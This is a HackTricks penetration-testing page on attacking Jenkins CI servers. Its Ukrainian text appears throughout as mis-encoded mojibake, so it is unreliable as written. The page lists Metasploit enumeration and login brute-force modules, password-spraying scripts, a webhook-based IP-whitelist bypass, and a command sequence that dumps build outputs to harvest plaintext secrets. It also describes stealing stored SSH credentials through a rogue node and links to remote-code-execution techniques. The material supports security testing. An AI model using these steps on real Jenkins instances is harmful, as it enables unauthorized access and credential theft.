# –ë–µ–∑–ø–µ–∫–∞ Jenkins

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è

Jenkins - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –ø—Ä–æ–ø–æ–Ω—É—î –ø—Ä–æ—Å—Ç–∏–π —Å–ø–æ—Å—ñ–± —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ **–ø–æ—Å—Ç—ñ–π–Ω–æ—ó —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó** –∞–±–æ **–ø–æ—Å—Ç—ñ–π–Ω–æ—ó –¥–æ—Å—Ç–∞–≤–∫–∏** (CI/CD) –¥–ª—è –º–∞–π–∂–µ **–±—É–¥—å-—è–∫–æ—ó** –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—ó **–º–æ–≤ –ø—Ä–æ–≥—Ä–∞–º—É–≤–∞–Ω–Ω—è** —Ç–∞ —Å—Ö–æ–≤–∏—â –∫–æ–¥—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω–≤–µ—ó—Ä—ñ–≤. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤—ñ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏–∑—É—î —Ä—ñ–∑–Ω–æ–º–∞–Ω—ñ—Ç–Ω—ñ —Ä—É—Ç–∏–Ω–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è —Ä–æ–∑—Ä–æ–±–∫–∏. –•–æ—á–∞ Jenkins –Ω–µ —É—Å—É–≤–∞—î **–ø–æ—Ç—Ä–µ–±—É —É —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –¥–ª—è –æ–∫—Ä–µ–º–∏—Ö –∫—Ä–æ–∫—ñ–≤**, –≤—ñ–Ω –Ω–∞–¥–∞—î —à–≤–∏–¥—à–∏–π —Ç–∞ –Ω–∞–¥—ñ–π–Ω—ñ—à–∏–π —Å–ø–æ—Å—ñ–± —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –≤—Å—ñ—î—ó –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ –∑–±—ñ—Ä–∫–∏, —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è —Ç–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –Ω—ñ–∂ –º–æ–∂–Ω–∞ –ª–µ–≥–∫–æ –ø–æ–±—É–¥—É–≤–∞—Ç–∏ –≤—Ä—É—á–Ω—É.


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## –ù–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ –µ–Ω—É–º–µ—Ä–∞—Ü—ñ—è

–î–ª—è –ø–æ—à—É–∫—É —Ü—ñ–∫–∞–≤–∏—Ö —Å—Ç–æ—Ä—ñ–Ω–æ–∫ Jenkins –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —Ç–∞–∫–∏—Ö —è–∫ (_/people_ –∞–±–æ _/asynchPeople_, —è–∫—ñ –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—é—Ç—å –ø–æ—Ç–æ—á–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –º–æ–∂–µ—Ç–µ –≤–∏ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó:
```
msf> use auxiliary/scanner/http/jenkins_command
```
–ë–µ–∑ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –≤–º—ñ—Å—Ç —à–ª—è—Ö—É _**/asynchPeople/**_ –∞–±–æ _**/securityRealm/user/admin/search/index?q=**_ –¥–ª—è **—ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**.

–ú–æ–∂–ª–∏–≤–æ, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é Jenkins –∑—ñ —à–ª—è—Ö—É _**/oops**_ –∞–±–æ _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### –í—ñ–¥–æ–º—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## –í—Ö—ñ–¥

–£ –±–∞–∑–æ–≤—ñ–π —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **–≤—Å—ñ —Å–ø–æ—Å–æ–±–∏ –≤—Ö–æ–¥—É –≤ Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### –†–µ—î—Å—Ç—Ä–∞—Ü—ñ—è

–í–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ Jenkins, —è–∫—ñ **–¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∞–º —Å—Ç–≤–æ—Ä–∏—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Ç–∞ —É–≤—ñ–π—Ç–∏ –≤ –Ω—å–æ–≥–æ. –¢–∞–∫ –ø—Ä–æ—Å—Ç–æ.**

### **SSO –í—Ö—ñ–¥**

–¢–∞–∫–æ–∂, —è–∫—â–æ **—Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å SSO/plugins** –±—É–ª–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ, –≤–∞–º —Å–ª—ñ–¥ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **—É–≤—ñ–π—Ç–∏** –¥–æ –ø—Ä–æ–≥—Ä–∞–º–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Å—Ç–æ–≤–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É (—Ç–æ–±—Ç–æ —Ç–µ—Å—Ç–æ–≤–æ–≥–æ **Github/Bitbucket –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É**). –•–∏—Ç—Ä—ñ—Å—Ç—å –∑ [**—Ç—É—Ç**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### –ë—Ä—É—Ç—Ñ–æ—Ä—Å

**Jenkins** –Ω–µ –º–∞—î **–ø–æ–ª—ñ—Ç–∏–∫–∏ –ø–∞—Ä–æ–ª—é** —Ç–∞ **–∑–∞—Ö–∏—Å—Ç—É –≤—ñ–¥ –±—Ä—É—Ç—Ñ–æ—Ä—Å—É —ñ–º–µ–Ω –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤**. –í–∞–∂–ª–∏–≤–æ **–±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—è **—Å–ª–∞–±–∫—ñ –ø–∞—Ä–æ–ª—ñ** –∞–±–æ **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —è–∫ –ø–∞—Ä–æ–ª—ñ**, –Ω–∞–≤—ñ—Ç—å **—ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —É –∑–≤–æ—Ä–æ—Ç–Ω–æ–º—É –ø–æ—Ä—è–¥–∫—É —è–∫ –ø–∞—Ä–æ–ª—ñ**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### –ü–æ—à—Ç–æ–≤—Ö–∞ –ø–∞—Ä–æ–ª—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [—Ü–µ–π —Å–∫—Ä–∏–ø—Ç Python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) –∞–±–æ [—Ü–µ–π —Å–∫—Ä–∏–ø—Ç PowerShell](https://github.com/chryzsh/JenkinsPasswordSpray).

### –û–±—Ö—ñ–¥ –±—ñ–ª–æ–≥–æ —Å–ø–∏—Å–∫—É IP-–∞–¥—Ä–µ—Å

–ë–∞–≥–∞—Ç–æ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ–π –ø–æ—î–¥–Ω—É—é—Ç—å **—Å–∏—Å—Ç–µ–º–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –¥–∂–µ—Ä–µ–ª–∞–º–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ SaaS (SCM)**, —Ç–∞–∫—ñ —è–∫ GitHub –∞–±–æ GitLab, –∑ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–º, —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–∏–º CI** —Ä—ñ—à–µ–Ω–Ω—è–º, —Ç–∞–∫–∏–º —è–∫ Jenkins –∞–±–æ TeamCity. –¶—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –¥–æ–∑–≤–æ–ª—è—î —Å–∏—Å—Ç–µ–º–∞–º CI **–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø–æ–¥—ñ—ó –≤–µ–±-–≥–∞—á–∫—ñ–≤ –≤—ñ–¥ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—ñ–≤ –∫–æ–Ω—Ç—Ä–æ–ª—é –≤–µ—Ä—Å—ñ–π SaaS**, –ø–µ—Ä–µ–≤–∞–∂–Ω–æ –¥–ª—è —Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è —Ä–æ–±–æ—á–∏—Ö –ø—Ä–æ—Ü–µ—Å—ñ–≤ –∫–æ–Ω–≤–µ—î—Ä—É.

–î–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó **–≤–∫–ª—é—á–∞—é—Ç—å –≤ –±—ñ–ª–∏–π —Å–ø–∏—Å–æ–∫** **–¥—ñ–∞–ø–∞–∑–æ–Ω–∏ IP-–∞–¥—Ä–µ—Å** **–ø–ª–∞—Ç—Ñ–æ—Ä–º SCM**, –¥–æ–∑–≤–æ–ª—è—é—á–∏ —ó–º –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó —Å–∏—Å—Ç–µ–º–∏ CI** —á–µ—Ä–µ–∑ **–≤–µ–±-–≥–∞—á–∫–∏**. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ **–±—É–¥—å-—Ö—Ç–æ** –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–∞–∫–∞—É–Ω—Ç** –Ω–∞ GitHub –∞–±–æ GitLab —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è **—Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è –≤–µ–±-–≥–∞—á–∫–∞**, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –∑–∞–ø–∏—Ç–∏ –¥–æ **–≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó —Å–∏—Å—Ç–µ–º–∏ CI**.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ:
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## –í–Ω—É—Ç—Ä—ñ—à–Ω—ñ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Jenkins

–£ —Ü–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö –º–∏ –±—É–¥–µ–º–æ –ø—Ä–∏–ø—É—Å–∫–∞—Ç–∏, —â–æ —É –≤–∞—Å —î –¥—ñ–π—Å–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ Jenkins.

{% hint style="warning" %}
–ó–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ–≥–æ –º–µ—Ö–∞–Ω—ñ–∑–º—É **–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó** –≤ Jenkins —Ç–∞ –¥–æ–∑–≤–æ–ª—ñ–≤ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤–∏ **–º–æ–∂–µ—Ç–µ –∞–±–æ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∞—Ç–∞–∫–∏.**
{% endhint %}

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –±–∞–∑–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### –ü–µ—Ä–µ–ª—ñ–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤

–Ø–∫—â–æ –≤–∏ –º–∞—î—Ç–µ –¥–æ—Å—Ç—É–ø –¥–æ Jenkins, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —ñ–Ω—à–∏—Ö –∑–∞—Ä–µ—î—Å—Ç—Ä–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∑–∞ –∞–¥—Ä–µ—Å–æ—é [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### –í–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–±—ñ—Ä–æ–∫ –¥–ª—è –ø–æ—à—É–∫—É —Ç–µ–∫—Å—Ç–æ–≤–∏—Ö —Å–µ–∫—Ä–µ—Ç—ñ–≤

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [—Ü–µ–π —Å–∫—Ä–∏–ø—Ç](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) –¥–ª—è –≤–∏–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤–∏–≤–æ–¥—ñ–≤ –∫–æ–Ω—Å–æ–ª—ñ –∑–±—ñ—Ä–æ–∫ —Ç–∞ –∑–º—ñ–Ω–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞ –∑–±—ñ—Ä–æ–∫, —â–æ–±, –º–æ–∂–ª–∏–≤–æ, –∑–Ω–∞–π—Ç–∏ —Ç–µ–∫—Å—Ç–æ–≤—ñ —Å–µ–∫—Ä–µ—Ç–∏.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **–í–∏–∫—Ä–∞–¥–µ–Ω–Ω—è SSH-–¥–∞–Ω–∏—Ö –¥–ª—è –≤—Ö–æ–¥—É**

–Ø–∫—â–æ –∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î **–¥–æ—Å—Ç–∞—Ç–Ω—å–æ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è/–∑–º—ñ–Ω–∏ –Ω–æ–≤–æ–≥–æ –≤—É–∑–ª–∞ Jenkins** —ñ SSH-–¥–∞–Ω—ñ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—à–∏—Ö –≤—É–∑–ª—ñ–≤ –≤–∂–µ –∑–±–µ—Ä–µ–∂–µ–Ω—ñ, –≤—ñ–Ω –º–æ–∂–µ **–≤–∏–∫—Ä–∞—Å—Ç–∏ —Ü—ñ –¥–∞–Ω—ñ**, —Å—Ç–≤–æ—Ä–∏–≤—à–∏/–∑–º—ñ–Ω–∏–≤—à–∏ –≤—É–∑–æ–ª —Ç–∞ **–≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ —Ö–æ—Å—Ç, —è–∫–∏–π –±—É–¥–µ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É** –±–µ–∑ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫–ª—é—á–∞ —Ö–æ—Å—Ç–∞:

![](<../../.gitbook/assets/image (56).png>)

–ó–∞–∑–≤–∏—á–∞–π –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ SSH-–¥–∞–Ω—ñ –¥–ª—è Jenkins —É **–≥–ª–æ–±–∞–ª—å–Ω–æ–º—É –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É** (`/credentials/`), —Ç–æ–º—É –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —ó—Ö –≤–∏—Ç—è–≥—Ç–∏, —è–∫ —ñ –±—É–¥—å-—è–∫—É —ñ–Ω—à—É —Å–µ–∫—Ä–µ—Ç–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –≤ —Ä–æ–∑–¥—ñ–ª—ñ [**–í–∏—Ç—è–≥–∞–Ω–Ω—è —Å–µ–∫—Ä–µ—Ç—ñ–≤**](./#dumping-secrets).

### **RCE –≤ Jenkins**

–û—Ç—Ä–∏–º–∞–Ω–Ω—è **–æ–±–æ–ª–æ–Ω–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ Jenkins** –¥–∞—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏—Ç—ñ–∫–∞—Ç–∏ –≤—Å—ñ **—Å–µ–∫—Ä–µ—Ç–∏** —Ç–∞ **–∑–º—ñ–Ω–Ω—ñ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞** —Ç–∞ **–µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —ñ–Ω—à—ñ –º–∞—à–∏–Ω–∏**, —â–æ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ –æ–¥–Ω—ñ–π –º–µ—Ä–µ–∂—ñ –∞–±–æ –Ω–∞–≤—ñ—Ç—å **–∑–±–∏—Ä–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ö–º–∞—Ä–∏**.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º Jenkins –±—É–¥–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏—Å—è —è–∫ SYSTEM**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è –Ω–∞–¥–∞—Å—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–ø—Ä–∏–≤—ñ–ª–µ—ó SYSTEM**.

### **RCE –°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–ó–º—ñ–Ω–∞ –ø—Ä–æ–µ–∫—Ç—É**

–°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–∑–º—ñ–Ω–∞ –ø—Ä–æ–µ–∫—Ç—É - —Ü–µ —Å–ø–æ—Å—ñ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE –í–∏–∫–æ–Ω–∞–Ω–Ω—è Groovy —Å–∫—Ä–∏–ø—Ç—É**

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ RCE, –≤–∏–∫–æ–Ω–∞–≤—à–∏ Groovy —Å–∫—Ä–∏–ø—Ç, —è–∫–∏–π –º–æ–∂–µ –±—É—Ç–∏ –±—ñ–ª—å—à –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–º, –Ω—ñ–∂ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE –°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–ó–º—ñ–Ω–∞ –∫–æ–Ω–≤–µ—î—Ä–∞

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ **RCE, —Å—Ç–≤–æ—Ä–∏–≤—à–∏/–∑–º—ñ–Ω–∏–≤—à–∏ –∫–æ–Ω–≤–µ—î—Ä**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –∫–æ–Ω–≤–µ—î—Ä–∞

–î–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –∫–æ–Ω–≤–µ—î—Ä—ñ–≤ –≤–∞–º –≤—Å–µ —â–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ Jenkins.

### –ü–æ–±—É–¥–æ–≤–∞ –∫–æ–Ω–≤–µ—î—Ä—ñ–≤

**–ö–æ–Ω–≤–µ—î—Ä–∏** —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ —è–∫ **–º–µ—Ö–∞–Ω—ñ–∑–º –ø–æ–±—É–¥–æ–≤–∏ –≤ –ø—Ä–æ–µ–∫—Ç–∞—Ö**, —É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –º–æ–∂–µ –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π **—Ñ–∞–π–ª –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é**, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç–∏–º–µ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å –∫–æ–Ω–≤–µ—î—Ä–∞. –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `/Jenkinsfile`:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–∑–±–µ—Ä—ñ–≥–∞—Ç–∏ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∫–æ–Ω–≤–µ—î—Ä–∞ –≤ —ñ–Ω—à–∏—Ö –º—ñ—Å—Ü—è—Ö** (—É —ñ–Ω—à–∏—Ö —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—è—Ö, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥) –∑ –º–µ—Ç–æ—é **–≤—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω–Ω—è** –¥–æ—Å—Ç—É–ø—É –¥–æ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é —Ç–∞ –¥–æ—Å—Ç—É–ø—É –¥–æ –∫–æ–Ω–≤–µ—î—Ä–∞.

–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—î **–ø—Ä–∞–≤–æ –Ω–∞ –∑–∞–ø–∏—Å —É —Ü–µ–π —Ñ–∞–π–ª**, –≤—ñ–Ω –∑–º–æ–∂–µ –π–æ–≥–æ **–∑–º—ñ–Ω–∏—Ç–∏** —Ç–∞ **–ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏** –∫–æ–Ω–≤–µ—î—Ä, –Ω–∞–≤—ñ—Ç—å –Ω–µ –º–∞—é—á–∏ –¥–æ—Å—Ç—É–ø—É –¥–æ Jenkins.\
